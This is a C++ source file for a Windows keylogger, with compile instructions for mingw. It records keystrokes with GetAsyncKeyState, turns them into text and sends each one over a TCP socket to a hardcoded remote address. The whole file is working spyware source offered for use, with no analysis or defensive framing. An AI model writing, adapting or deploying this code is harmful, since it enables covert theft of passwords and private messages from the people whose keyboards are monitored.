/* Tested: Windows XP/7/8
 * Compiler: mingw
 * Compile with: g++ WinKeylog.cpp -lWs2_32
 * Some of the code is from:
 * http://www.online-tutorials.net/system/keylogger-tastatur-abfragen/sourcecodes-t-19-270.html
 */

#include <string.h> 
#include <iostream>
#include <winsock2.h>
 
std::string GetKey(int Key) 
{ 
	std::string KeyString = ""; 

	if (Key == 8) 
		KeyString = "[delete]"; 
	if (Key == 13) 
		KeyString = "\n"; 
	if (Key == 32) 
		KeyString = " "; 
	if (Key == VK_PAUSE) 
		KeyString = "[PAUSE]"; 
	if (Key == VK_CAPITAL) 
		KeyString = "[CAPITAL]"; 
	if (Key == VK_SHIFT) 
		KeyString = "[SHIFT]"; 
	if (Key == VK_TAB) 
		KeyString = "[TABULATOR]"; 
	if (Key == VK_CONTROL)
		KeyString = "[CTRL]"; 
	if (Key == VK_ESCAPE) 
		KeyString = "[ESCAPE]"; 
	if (Key == VK_END) 
		KeyString = "[END]"; 
	if (Key == VK_HOME) 
		KeyString = "[HOME]"; 
	if (Key == VK_LEFT) 
		KeyString = "[LEFT]"; 
	if (Key == VK_RIGHT) 
		KeyString = "[RIGHT]"; 
	
	if (Key >=96 && Key <= 105){ 
		KeyString = Key-48; 
	} 
	if (Key > 47 && Key < 60){ 
		KeyString = Key; 
	} 
	if (Key != VK_LBUTTON || Key != VK_RBUTTON) 
	{ 
		if (Key > 64 && Key < 91) 
		{ 
			if (GetKeyState(VK_CAPITAL)) 
				KeyString = Key; 
			else 
			{ 
				Key = Key + 32; 
				KeyString = Key; 
			} 
		} 
	} 

	return KeyString; 
} 

int main() 
{ 
	WSAData version;     
	WORD mkword=MAKEWORD(2,2);
	WSAStartup(mkword,&version);

	SOCKET u_sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	sockaddr_in addr;
	addr.sin_family=AF_INET;
	addr.sin_addr.s_addr=inet_addr("192.168.10.29");
	addr.sin_port=htons(80);

	int conn=connect(u_sock,(SOCKADDR*)&addr,sizeof(addr));
	if(conn==SOCKET_ERROR) {
		closesocket(u_sock);
		WSACleanup();
	}

	char vect[512]={0};

	std::string TempString = ""; 

	while(true) 
	{ 
		Sleep(5); 

		for(int i = 8; i < 191; i++) 
		{ 
			if(GetAsyncKeyState(i)&1 ==1) 
			{ 
				TempString = GetKey (i); 
				int smsg=send(u_sock, TempString.c_str(), TempString.length(), 0);
				if(smsg==SOCKET_ERROR)
					WSACleanup();
			} 
		} 
	}
	closesocket(u_sock);
	return 0; 
}  

